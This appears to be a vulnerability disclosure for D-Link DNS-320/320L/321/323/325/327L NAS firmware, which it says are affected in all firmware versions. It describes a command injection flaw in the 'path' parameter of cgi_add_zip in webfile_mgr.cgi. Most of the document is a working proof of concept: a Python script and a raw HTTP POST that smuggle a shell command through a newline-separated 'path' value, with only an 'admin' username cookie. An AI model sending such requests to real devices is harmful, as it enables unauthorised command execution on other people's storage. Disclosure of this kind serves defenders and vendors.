# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_add_zip function of the file /cgi-bin/webfile_mgr.cgi.  The variable `path`is passed from a POST request and is assigned to `v3` via the `snprintf` function at line 35 and invoked by the `popen` command, the fix_path_special_char function did not work which leads to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723733031582-8a439208-fffd-4571-ad0b-e891b66aa341.png#averageHue=%23fefefd&clientId=u40cede71-c2b5-4&from=paste&height=164&id=u5964a9f5&originHeight=164&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23758&status=done&style=none&taskId=u1794a916-7991-431e-a41a-4ac12e5be95&title=&width=690)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723733027241-7d6e9393-d4cb-40cb-8ba6-5539c931a245.png#averageHue=%23fefefa&clientId=u40cede71-c2b5-4&from=paste&height=179&id=u6460ef42&originHeight=179&originWidth=1075&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25603&status=done&style=none&taskId=u271d9e7d-ae17-4d18-86a1-202b23d56dc&title=&width=1075)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/webfile_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_add_zip&name=1&path=;%0atouch%09/tmp/122%0a;"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/webfile_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_add_zip&name=1&path=;%0atouch%09/tmp/122%0a;
```

